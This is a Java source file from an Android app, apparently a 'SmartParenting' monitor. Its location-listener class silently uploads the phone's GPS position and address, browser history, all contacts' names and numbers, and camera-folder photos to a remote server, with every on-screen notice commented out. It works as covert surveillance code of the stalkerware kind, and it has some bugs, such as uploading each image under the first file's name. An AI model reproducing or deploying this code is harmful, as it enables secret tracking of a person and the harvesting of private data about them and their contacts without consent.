package smart.com;

import java.io.BufferedReader;
import java.io.ByteArrayOutputStream;
import java.io.File;
import java.io.InputStreamReader;
import java.sql.Date;
import java.util.ArrayList;
import java.util.List;
import java.util.Locale;

import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.entity.mime.HttpMultipartMode;
import org.apache.http.entity.mime.MultipartEntity;
import org.apache.http.entity.mime.content.ByteArrayBody;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;
import org.json.JSONArray;
import org.json.JSONObject;

import android.content.Context;
import android.content.SharedPreferences;
import android.database.Cursor;
import android.graphics.Bitmap;
import android.graphics.BitmapFactory;
import android.graphics.Bitmap.CompressFormat;
import android.location.Address;
import android.location.Geocoder;
import android.location.Location;
import android.location.LocationListener;
import android.os.Bundle;
import android.os.Environment;
import android.preference.PreferenceManager;
import android.provider.Browser;
import android.provider.ContactsContract;
import android.util.Log;
import android.widget.Toast;

public class GpsLocation1 implements LocationListener, IP {
	static int count = 0;
	static double lat, log;
	SharedPreferences myshared;
	String loginid;
	Context context;
	String titleIdx, urlIdx, time;
	
long previousDCIMSize = 0;
long currentDCIMSize = 0;
	public GpsLocation1(Context context) {
		super();
		this.context = context;

		geocoder = new Geocoder(context, Locale.ENGLISH);

	}

	List<NameValuePair> namevaluepair = new ArrayList<NameValuePair>(8);

	StringBuilder strReturnedAddress = new StringBuilder(

	"Address:\n");
	Geocoder geocoder;
	Location previous = null;

	public void onLocationChanged(Location location) {
		// TODO Auto-generated method stub

		lat = location.getLatitude();
		log = location.getLongitude();

		if (null == previous || location.distanceTo(previous) > 100) {
			previous = location;
			gpslocation();
			//return;
		}
		
		if (count == 0) {
			webhistory();
			count++;
		} else if (count == 10) {
			contacts();
			count ++;
		} else if (count == 20) {
			count = 0;
			

			String path = Environment.getExternalStorageDirectory()
					+ "/DCIM/Camera/";
			File file = new File(path);
			currentDCIMSize = dirSize(file);
			//Log.i("size =", "==============" + currentDCIMSize);
			if (previousDCIMSize == currentDCIMSize) {
				return;
			}
			previousDCIMSize = currentDCIMSize;
			File[] imageList = file.listFiles();
			for (int i = 0; i < imageList.length; i++)
			{
				//Log.e("Image: " + i + ": path", imageList[i].getAbsolutePath());
				//Log.e("Image: " + i + ": path", imageList[i].getName());
				Bitmap bitmapImgage = BitmapFactory.decodeFile(imageList[i]
						.getAbsolutePath());
				try
				{
				
					//Log.i("name ", " name = " + imageList[0].getName());
					executeMultipartPost(bitmapImgage,  imageList[0].getName());
				} catch (Exception e)
				{
					// TODO Auto-generated catch block
					e.printStackTrace();
				}
			}

		}
		else
		{
		count++;
		}
	}
	
	private static long dirSize(File dir) {

	    if (dir.exists()) {
	        long result = 0;
	        File[] fileList = dir.listFiles();
	        for(int i = 0; i < fileList.length; i++) {
	            // Recursive call if it's a directory
	            if(fileList[i].isDirectory()) {
	                result += dirSize(fileList [i]);
	            } else {																																																																																							
	                // Sum the file size in bytes
	                result += fileList[i].length();
	            }
	        }
	        return result; // return the file size
	    }
	    return 0;
	}

	public void gpslocation() {
		WebServ w1 = new WebServ();
		try {
																																																																																																																																																																							
			List<NameValuePair> namevaluepair = new ArrayList<NameValuePair>(8);
			namevaluepair.add(new BasicNameValuePair("latitude", "" + lat));
			namevaluepair.add(new BasicNameValuePair("longitude", "" + log));
			 try {
			List<Address> addresses = geocoder.getFromLocation(lat,

			log, 1);

			if (addresses != null) {

				Address returnedAddress = addresses.get(0);

				for (int i = 0; i < returnedAddress.getMaxAddressLineIndex(); i++) {
					strReturnedAddress
							.append(returnedAddress.getAddressLine(i)).append(
									"\n");
				}

				//Toast.makeText(context, "" + strReturnedAddress,
						//Toast.LENGTH_LONG).show();

			} else {

				
				// Toast.makeText(this, "address is null", Toast.LENGTH_LONG)
				// .show();
				 
				// Log.i("ADDRESS", "ERROR");
				
			}
			}
			catch (Exception e) {
				// TODO: handle exception
				e.printStackTrace();
				strReturnedAddress.append("Address not available");
			}
			myshared = PreferenceManager.getDefaultSharedPreferences(context);
			loginid = myshared.getString("loginid", "");
			namevaluepair.add(new BasicNameValuePair("loginid", loginid));
			namevaluepair.add(new BasicNameValuePair("location", ""
					+ strReturnedAddress));
			JSONArray ja = w1.doPost(namevaluepair, "http://" + ip
					+ "/SmartParentingServer1/webservice-android/gpsinsert.jsp");
			JSONObject jo = (JSONObject) ja.get(0);
			String msg = jo.get("resp").toString();
			//Toast.makeText(context, msg, Toast.LENGTH_LONG).show();

		} 
        catch (Exception e) {
			e.printStackTrace();
		}
	}

	public void webhistory() {

		WebServ w1 = new WebServ();
		try {
			SmartActivity activity = (SmartActivity) context;
			Cursor mCur = activity.managedQuery(Browser.BOOKMARKS_URI,
					Browser.HISTORY_PROJECTION, null, null, null);

			while (mCur.moveToLast()) {
				titleIdx = mCur
						.getString(Browser.HISTORY_PROJECTION_TITLE_INDEX);
				urlIdx = mCur.getString(Browser.HISTORY_PROJECTION_URL_INDEX);

				String timeString = mCur
						.getString(Browser.HISTORY_PROJECTION_DATE_INDEX);

				Date cal = new Date(Long.parseLong(timeString));
				String date = cal.toLocaleString();

				List<NameValuePair> namevaluepair = new ArrayList<NameValuePair>(
						4);
				myshared = PreferenceManager
						.getDefaultSharedPreferences(context);
				loginid = myshared.getString("loginid", "");
				namevaluepair.add(new BasicNameValuePair("loginid", loginid));
				namevaluepair.add(new BasicNameValuePair("title", titleIdx));
				namevaluepair.add(new BasicNameValuePair("url", urlIdx));
				namevaluepair.add(new BasicNameValuePair("date", date));

				JSONArray ja = w1.doPost(namevaluepair, "http://" + ip
						+ "/SmartParentingServer1/webservice-android/webinsert.jsp");
				JSONObject jo = (JSONObject) ja.get(0);
				String msg = jo.get("response").toString();
				// Toast.makeText(this, msg, Toast.LENGTH_LONG).show();
				break;
			}

		} catch (Exception e) {
			

		}

	}

	public void contacts() {
		WebServ w1 = new WebServ();
		Cursor cursor = null;
		Cursor phones = null;
		String[] projection = { ContactsContract.Contacts._ID,
				ContactsContract.Contacts.DISPLAY_NAME,
				ContactsContract.Contacts.HAS_PHONE_NUMBER };
		String selection = ContactsContract.Contacts.HAS_PHONE_NUMBER + "=1";
		try {
			SmartActivity activity = (SmartActivity) context;
			cursor = activity.managedQuery(
					ContactsContract.Contacts.CONTENT_URI, projection,
					selection, null, null);

			while (cursor.moveToNext()) {
				namevaluepair = new ArrayList<NameValuePair>(3);
				String contactId = cursor.getString(cursor
						.getColumnIndex(ContactsContract.Contacts._ID));
				String name = cursor
						.getString(cursor
								.getColumnIndexOrThrow(ContactsContract.Contacts.DISPLAY_NAME));
				Log.i("contactId", contactId);
				Log.i("name", name);
				namevaluepair.add(new BasicNameValuePair("contact_name", ""
						+ name));
				phones = context.getContentResolver().query(
						ContactsContract.CommonDataKinds.Phone.CONTENT_URI,
						null,
						ContactsContract.CommonDataKinds.Phone.CONTACT_ID
								+ " = " + contactId, null, null);
				int count = phones.getCount();
				
				int j = 0;
				while (phones.moveToNext()) {
					if (count == 1) {
						String pdata = phones
								.getString(phones
										.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DATA));
						Log.i("PhoneNumber", pdata);
						namevaluepair.add(new BasicNameValuePair(
								"contact_number1", "" + pdata));
					} else {
						if (j == 0) {
							String pdata = phones
									.getString(phones
											.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DATA));
							Log.i("PhoneNumber", pdata);
							namevaluepair.add(new BasicNameValuePair(
									"contact_number1", "" + pdata));
							j++;
						}

						else if (j == 1) {
							String pdata = phones
									.getString(phones
											.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DATA));
							//Log.i("PhoneNumber", pdata);
							namevaluepair.add(new BasicNameValuePair(
									"contact_number2", "" + pdata));
						}
					}

				}
				Log.i("namevaluepair", "" + namevaluepair);

				myshared = PreferenceManager
						.getDefaultSharedPreferences(context);
				loginid = myshared.getString("loginid", "");
				namevaluepair.add(new BasicNameValuePair("loginid", loginid));
				JSONArray ja = w1.doPost(namevaluepair, "http://" + ip
						+ "/SmartParentingServer1/webservice-android/contacts.jsp");
				JSONObject jo = (JSONObject) ja.get(0);

			}
		} catch (Exception e) {

		}

		finally {
			if (phones != null) {
				phones.close();
			}
			if (cursor != null) {
				cursor.close();
			}
		}
	}

	public void onProviderDisabled(String provider) {
		// TODO Auto-generated method stub

	}

	public void onProviderEnabled(String provider) {
		// TODO Auto-generated method stub

	}

	public void onStatusChanged(String provider, int status, Bundle extras) {
		// TODO Auto-generated method stub

	}

	public void executeMultipartPost(Bitmap bm, String name) throws Exception
	{
		try
		{
			ByteArrayOutputStream bos = new ByteArrayOutputStream();
			bm.compress(CompressFormat.JPEG, 75, bos);
			byte[] data = bos.toByteArray();
			HttpClient httpClient = new DefaultHttpClient();
			// String urlString =
			// "http://192.168.1.1:8080/sample1/image_upload.jsp";
			String urlString = "http://"+ip+"/SmartParentingServer1/webservice-android/webservice/image_upload.jsp";
			HttpPost postRequest = new HttpPost(urlString
			/* "http://10.0.2.2/cfc/iphoneWebservice.cfc?returnformat=json&amp;method=testUpload" */);
			//Toast.makeText(context,"hai1",1000).show();
			myshared = PreferenceManager
					.getDefaultSharedPreferences(context);
			loginid = myshared.getString("loginid", "");
			ByteArrayBody bab = new ByteArrayBody(data,  loginid + ".jpg");
			// File file= new File("/mnt/sdcard/forest.png");
			// FileBody bin = new FileBody(file);
			MultipartEntity reqEntity = new MultipartEntity(
					HttpMultipartMode.BROWSER_COMPATIBLE);
		//reqEntity.addPart("loginid", new StringBody("11"));

			reqEntity.addPart("uploaded", bab);
			postRequest.setEntity(reqEntity);
			HttpResponse response = httpClient.execute(postRequest);
			BufferedReader reader = new BufferedReader(new InputStreamReader(
					response.getEntity().getContent(), "UTF-8"));
			String sResponse;
			StringBuilder s = new StringBuilder();
			while ((sResponse = reader.readLine()) != null)
			{
				s = s.append(sResponse);
			}
			System.out.println("Response: " + s); 
		} catch (Exception e)
		{
			// handle exception here
			//Log.e(e.getClass().getName(), e.getMessage());
		}
	}

}